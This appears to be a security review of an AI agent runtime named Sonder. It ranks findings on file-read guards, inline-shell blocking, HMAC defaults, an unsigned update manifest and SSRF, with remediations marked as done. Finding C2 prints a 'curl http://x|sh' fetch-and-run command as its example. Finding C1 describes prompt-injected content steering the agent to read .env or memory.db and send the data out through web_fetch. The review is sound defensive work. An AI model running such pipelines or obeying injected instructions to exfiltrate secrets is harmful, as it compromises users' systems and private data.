# Sonder Runtime — Security Review (ranked findings)

Scope, methodology, and how to regenerate this document are described in
[README.md](./README.md). This file is the ranked findings list.

Every finding names a concrete `file:line` anchor, a failure scenario with
inputs/state → bad outcome, and a suggested remediation. Findings are split
into **CONFIRMED** (a code path was traced end to end) and
**NEEDS-VERIFICATION** (a plausible concern whose exploitability depends on a
call site or deployment fact not fully traced here). Surfaces that are actually
well-defended are recorded too, because "this is safe and here is why" is a
result the next reviewer should not have to re-derive.

Line numbers were accurate at review time against the working tree; they may
drift as files change. Anchor on the named function, not just the integer.

> **Remediation status (update):** all three CONFIRMED findings (C1, C2, C3)
> and the three NEEDS-VERIFICATION items (V1, V2, V3) have since been fixed and
> covered by tests. V1 was independently confirmed as a real
> signature-bypass-to-execution before the fix. Each remediation narrows attack
> surface and preserves the existing developer-token / explicit-gate escape
> hatches. See the per-finding "Remediation" notes and the summary table.

---

## CONFIRMED

### C1 — Secret / control-plane files are readable through the direct guarded read tools

- **Severity:** medium (confidentiality; higher under prompt-injection + an egress channel)
- **Anchors:**
  - `file_ops.py:398` `resolve_path` — the read path enforces root containment only.
  - `file_ops.py:476` `read_file`, `file_ops.py:892` `inspect_data` — call `resolve_path`, never `_is_sensitive_control_path` / `_is_secret_path`.
  - `file_ops.py:148` `_is_secret_path` and `file_ops.py:161` `_is_sensitive_control_path` — the secret/control classifier exists, but is consumed only by the *mutation* guard (`_require_mutation_access`, `file_ops.py:180`) and by the delegated-repository read lane (`resolve_repository_read_path`, `file_ops.py:213`, called with `reject_sensitive=True` from `server.py:9836`).
  - `server.py:6773` `file_read` / `server.py:6799` `data_inspect` — pass no sensitivity gate; only writes get `developer_authorized=_file_developer_allowed(token)`.

- **Failure scenario:** The default allowed roots are Sonder's install directory
  and `SONDER_HOME` (`file_ops.py:84` `allowed_roots`). Those trees legitimately
  contain `memory.db` (all stored memories), `combined_personal.jsonl`
  (personal chat/training corpus), and can contain `.env`, `secrets.json`,
  `credentials.json`, or `*.pem`. A local agent turn — including one steered by
  prompt-injected content the model just fetched or read — can call
  `file_read(".env")` / `data_inspect("memory.db")` and receive the contents,
  then relay them out through `web_fetch` (URL is attacker-chosen within the
  public-URL policy). Writes to those same paths are refused without a developer
  token; reads are not. The asymmetry means the classifier the authors already
  wrote is simply not applied on the read path the model actually uses in
  non-repository mode.

- **Why it is only "medium":** it requires the file tools to be enabled for the
  turn, a secret to sit inside a root, and (for exfiltration) `allow_web`. The
  delegated-repository lane — the one designed for untrusted external repos — is
  correctly hardened, so this is a gap in the *first-party* lane, not the
  sandboxed one.

- **Remediation:** default the direct read tools to `reject_sensitive=True`
  (reuse `_is_sensitive_control_path` in `read_file` / `inspect_data` /
  `read_line_range` / `image_inspect` for the non-developer, non-bypass path),
  and require an explicit developer token or bypass to read a classified path —
  mirroring the write guard. Treat `memory.db` and the personal corpus as
  first-class secrets.

### C2 — Inline-shell hardening in `run_program` is inconsistent (PowerShell/cmd blocked, bash/sh/python/node not)

- **Severity:** low–medium (defense-in-depth / misleading guarantee)
- **Anchors:** `workbench.py:731-738` `run_program` — refuses PowerShell
  `-command/-c/-encodedcommand/-enc`, refuses `cmd`/`cmd.exe`, and refuses
  `.bat/.cmd` unless `_allow_cmd_script`. No equivalent guard for
  `bash -c` / `sh -c` / `zsh -c` / `python -c` / `node -e` / `perl -e` / `ruby -e` / `php -r`.
  `_resolve_program` (`workbench.py:649`) resolves any bare name via
  `shutil.which`, so any interpreter on `PATH` is reachable.

- **Failure scenario:** the PowerShell/cmd checks exist to force callers through
  `run_script`, whose `.bat/.cmd` branch applies metacharacter validation
  (`workbench.py:831`). `run_program("bash", args_json='["-c","curl http://x|sh"]')`
  runs an arbitrary shell pipeline and never touches that validation. The block
  therefore stops one family of inline evaluation while leaving the more common
  ones open, which reads as a stronger guarantee than it provides.

- **Honest caveat:** `run_program` is argv-only-but-still-arbitrary *by design*
  (see `workbench.py` module docstring and `code_runner.py:5`). Running
  `bash -c ...` is not more powerful than dropping a `.sh` and calling
  `run_script`. So this is an inconsistency/clarity issue, not a sandbox escape.

- **Remediation:** either (a) drop the PowerShell/cmd special-case and document
  plainly that program execution is unconstrained when the tool is enabled, or
  (b) extend the inline-evaluator refusal consistently across `bash`, `sh`,
  `zsh`, `python`, `node`, `perl`, `ruby`, `php` so the stated intent holds.

### C3 — Account-session HMAC key falls back to a public constant when `SONDER_AUTH_SECRET` is unset

- **Severity:** low (mitigated by bind-security validation + random tokens)
- **Anchors:** `admin_auth.py:17-18` `_secret()` returns
  `"sonder-local-dev-secret"` when `SONDER_AUTH_SECRET` is absent;
  `admin_auth.py:44` `_hash_token` keys the session-token HMAC with it;
  `admin_auth.py:207` `authenticate` looks sessions up by `_hash_token(token)`.

- **Failure scenario:** with the default secret, the token→hash mapping is
  computable by anyone. Impact is bounded because a valid session still requires
  a stored row keyed by the hash of a 24-byte `os.urandom` token
  (`admin_auth.py:29`), which is unforgeable without the raw token; and
  `_validate_bind_security` (`sonder_serve.py:489`, `sonder_config.py:395-405`)
  rejects non-loopback binds in account modes unless `auth_secret` is ≥32 chars,
  which the 21-char dev default fails. So the weak default is reachable only on
  loopback single-user deployments.

- **Remediation:** refuse to start any account-bearing auth mode with the
  built-in default secret (fail closed even on loopback), or derive a
  per-install random secret on first run and persist it 0600.

---

## NEEDS-VERIFICATION

### V1 — `manifest.json` drives install behavior but is read outside the TUF-verified target set

- **Severity:** medium→high if confirmed (integrity / possible code execution)
- **Anchors:** `sonder_updates.py:179` `BundleManifest.load` reads
  `bundle_dir/manifest.json` directly from disk; `sonder_updates.py:643`
  `_verify_with_tuf` verifies length/hashes of **the archive target only**
  (`manifest["archive"]["name"]`), not `manifest.json`; `build_bundle`
  (`sonder_updates.py:286`) writes `manifest.json` beside the archive, **not
  inside** the tar. The manifest supplies `health_checks[].argv`
  (`sonder_updates.py:322`), `entrypoints`, `state_schema`, and resource budgets
  used by `check_compatibility` (`sonder_updates.py:701`).

- **Concern to verify:** an attacker who can alter the on-disk bundle directory
  but not the signed archive could rewrite `manifest.json` — including
  `health_checks[].argv`, which is later executed as a command during
  `health_check`. Whether that argv is actually run, and whether the install
  path cross-checks the extracted tree/manifest against the signed archive, is
  in `sonder_update_engine.py` (not fully traced here). If the manifest is not
  itself a signed TUF target and its `health_checks.argv` reaches a subprocess,
  this is a signature-bypass-to-execution path.

- **Suggested check / remediation:** confirm in `sonder_update_engine.py` that
  (a) `manifest.json` is either included as a signed TUF target or its digest is
  pinned inside the signed archive, and (b) `health_checks[].argv` templates are
  constrained (no arbitrary executable from an unsigned manifest). If not, make
  the manifest a signed target and validate it before consuming any field.

### V2 — `resumable_download` performs no SSRF pinning on the update source URL

- **Severity:** low (operator-configured source; content is hash/TUF-gated)
- **Anchors:** `sonder_updates.py:413-414` `_default_opener` calls
  `urllib.request.urlopen` directly, unlike `web_tools._urlopen`
  (`web_tools.py:267`) which pins to pre-validated public addresses.

- **Concern to verify:** if the download URL (`source_ref` on an update plan) can
  be influenced by anything less trusted than the operator, this is a blind-SSRF
  primitive (internal host/port reachability via connect/timing/error
  differences). Downloaded bytes are length+SHA-256 verified
  (`sonder_updates.py:437-444`) and gated by TUF, so it is not a
  content-exfil-to-disk path. Verify who can set `source_ref` and whether update
  origins are allow-listed.

- **Remediation:** if the source can ever be non-operator-controlled, route the
  fetch through the same public-address validation/pinning used by `web_tools`,
  or restrict update origins to a configured allow-list.

### V3 — `resolve_cwd` / process cwd confinement uses `abspath`, not `realpath`

- **Severity:** info (code execution is arbitrary by design here)
- **Anchors:** `code_runner.py:143-159` `resolve_cwd` computes containment with
  `os.path.abspath` + `os.path.commonpath`, so a symlinked directory under the
  workspace can point the child process's working directory outside the
  workspace. (`workbench.py` resolves through `file_ops.resolve_path`, which does
  `.resolve()` and is not affected.)

- **Why it is only info:** `code_runner` states plainly it is *not* a security
  sandbox (`code_runner.py:5`); the snippet already runs arbitrary local code, so
  cwd containment is a tidiness boundary, not a trust boundary.

- **Remediation:** if cwd is ever treated as a real boundary, use
  `os.path.realpath` before the `commonpath` check, matching `file_ops`.

---

## WELL-DEFENDED (validated, no action needed)

### D1 — SSRF / DNS-rebinding defense in `web_tools` is thorough

- **Anchors:** `web_tools.py:357` `_validated_public_target`, `web_tools.py:334`
  `_resolve_public_addresses`, `web_tools.py:322` `_is_globally_routable`,
  `web_tools.py:189` `_connect_pinned_socket`, `web_tools.py:667` `_request`.
- **Why it holds:** hostnames are resolved once and the TCP connection is
  **pinned** to those pre-validated addresses (`_urlopen`, `web_tools.py:267`),
  closing the classic resolve-then-reconnect DNS-rebinding window. Rejected:
  private / loopback / link-local / reserved / multicast / unspecified addresses,
  IPv4-mapped IPv6 (unwrapped before the check), non-canonical numeric hosts
  (`0x…`, decimal-int), URL userinfo, `localhost`, and non-http(s) schemes. Each
  redirect hop is **re-validated** (`web_tools.py:671`), so a 302 to
  `http://169.254.169.254/` is caught. TLS still verifies and sends SNI for the
  real hostname while the socket stays pinned (`web_tools.py:234`). Response
  bodies are byte-capped and decompression is bounded to
  `MAX_DECOMPRESSED_BYTES` with a fail-closed expansion check
  (`web_tools.py:639`).

### D2 — Consent gates are layered and fail-closed

- **Anchors:** web — `web_tools.py:180` `enabled()` (`SONDER_WEB_TOOLS`) plus
  per-turn `allow_web` (`server.py:10387`); location — `server.py:3213`
  `_env_location_consent` (off by default), server wrapper `server.py:8665`
  refuses without `consent=True`, agent path `server.py:10394` requires
  `allow_web` **and** `allow_location` **and** `consent`; remote-Ollama —
  `sonder_config.py:418-422` rejects a non-loopback `ollama.url` unless
  `allow_remote` is set; cloud — `sonder_config.py:331` `SONDER_ALLOW_CLOUD`
  feature flag, enforced at the operation-context gate (`server.py:743`).
- **Why it holds:** each capability is default-denied and re-checked at the tool
  boundary, not only at config load; the location gate in particular is checked
  at three independent layers, and the raw IP is explicitly not retained
  (`web_tools.py:1049` `normalize_location_hint`, `web_tools.py:1102`).

### D3 — Secret rotation and redaction

- **Anchors:** `sonder_secrets.py:46` `_write_private` (O_CREAT|O_TRUNC, mode
  `0600`, fsync, atomic `os.replace`); `sonder_secrets.py:79` `previous_key_valid`
  (constant-time `hmac.compare_digest`, mandatory overlap **expiry enforced in
  the check itself**, not by a cleanup job); `sonder_secrets.py:42` `_hash_key`
  (only the SHA-256 of the previous key is persisted); rotate never prints a key
  (`sonder_secrets.py:172`).
- **Minor gap (info):** the "must not be group/world accessible" pre-check is
  POSIX-only (`sonder_secrets.py:119`), so a Windows secrets file with loose ACLs
  is not refused. Low impact given the loopback/TLS-proxy posture, but worth a
  note.

### D4 — Update archive extraction is adversary-aware

- **Anchors:** `sonder_updates.py:504` `safe_extract` / `sonder_updates.py:529`
  `_extract_members` reject absolute paths, `..` traversal, symlinks/hardlinks,
  devices/fifos, unsupported member types, negative sizes, and enforce a
  cumulative `max_expanded_bytes` budget (zip-bomb guard). Manifest file entries
  are independently checked for absolute/`..` paths (`sonder_updates.py:172-176`).
  The unsigned path requires **both** the caller flag and
  `SONDER_UPDATE_ALLOW_UNSIGNED=1` (`sonder_updates.py:599-608`); TUF is used
  whenever `metadata/` is present and python-tuf is mandatory in that case
  (`sonder_updates.py:590-598`). No custom signature parsing exists. Active
  release is never overwritten in place; the pointer swap is atomic
  (`sonder_updates.py:456` `switch_active_pointer`).

### D5 — Process-tree termination on timeout

- **Anchors:** `workbench.py:756-765` launches with `start_new_session=True`
  (POSIX) / `CREATE_NEW_PROCESS_GROUP` (Windows); `workbench.py:701`
  `_terminate_process_tree` uses `os.killpg(..., SIGKILL)` on POSIX and
  `taskkill /T /F` on Windows, with a `proc.kill()` fallback. Output pipes are
  drained on threads with capped retention (`workbench.py:670` `_drain_pipe`),
  so a chatty child cannot hide an unbounded read or wedge the timeout.

### D6 — HTTP admission / auth posture

- **Anchors:** `sonder_serve.py:386` `check_auth` (constant-time compare);
  `sonder_serve.py:418` `_auth_context` (rotation-overlap previous key accepted
  until expiry); `sonder_serve.py:489` `_validate_bind_security` (non-loopback
  bind requires explicitly strong auth and TLS-terminating proxy; `local-open`
  is impossible off-loopback); `sonder_config.py:385-405` mirrors the rule at
  config-validate time. Passwords use PBKDF2-HMAC-SHA256 at 120k iterations
  (`admin_auth.py:33`); session tokens are random and stored hashed
  (`admin_auth.py:196-201`); the first hosted admin consumes a bootstrap secret
  exactly once under a constant-time compare (`admin_auth.py:130-138`).
- **Note:** on loopback with no API key, `check_auth` returns `True` (auth
  disabled) — intended for the single-user local profile, and prevented off
  loopback by D6's bind validation.

---

## Summary table

| ID | Title | Severity | Status |
|----|-------|----------|--------|
| C1 | Secret/control files readable via direct read tools | medium | confirmed → **fixed** |
| C2 | Inconsistent inline-shell hardening in `run_program` | low–med | confirmed → **fixed** (incl. glued-flag bypass) |
| C3 | Default public HMAC secret for account sessions | low | confirmed → **fixed** |
| V1 | `manifest.json` outside the TUF-signed target set | med–high | confirmed → **fixed** |
| V2 | No SSRF pinning on update download URL | low | **fixed** |
| V3 | `resolve_cwd` containment uses `abspath` not `realpath` | info | **fixed** |
| D1 | SSRF/DNS-rebinding defense | — | well-defended |
| D2 | Layered consent gates | — | well-defended |
| D3 | Secret rotation / redaction | — | well-defended |
| D4 | Update archive extraction + trust gate | — | well-defended |
| D5 | Process-tree termination | — | well-defended |
| D6 | HTTP admission / auth posture | — | well-defended |

All findings above have been remediated. **V1** was the highest-value fix:
`manifest.json` is now a signed TUF target, verified before any field is
consumed, and `health_checks[].argv` is constrained to the release's own
interpreter — closing the confirmed signature-bypass-to-execution path.
